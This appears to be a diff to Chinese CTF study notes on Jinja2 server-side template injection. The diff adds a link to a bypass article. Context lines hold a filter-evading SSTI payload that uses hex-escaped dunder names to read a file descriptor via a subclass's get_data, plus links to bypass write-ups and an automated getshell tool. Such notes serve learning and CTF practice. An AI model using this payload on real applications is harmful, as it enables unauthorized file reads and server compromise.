@@ -225,6 +225,7 @@ get_data方法直接读打开过的文件内容
 {{()["\x5F\x5Fclass\x5F\x5F"]["\x5F\x5Fbases\x5F\x5F"][0]["\x5F\x5Fsubclasses\x5F\x5F"]()[91]["get\x5Fdata"](0, "/proc/self/fd/3")}}
 ```
 SSTI绕过注入:<https://xz.aliyun.com/t/3679#toc-11>
+<https://www.cnblogs.com/2ha0yuk7on/p/16648850.html>
 ctf详解:<https://www.cnblogs.com/Article-kelp/p/14797393.html#questionOne>
 python解题模板:<https://blog.csdn.net/qq_51096893/article/details/122020518>
 全自动绕过getshell的jinjia2工具：<https://github.com/Marven11/Fenjing>
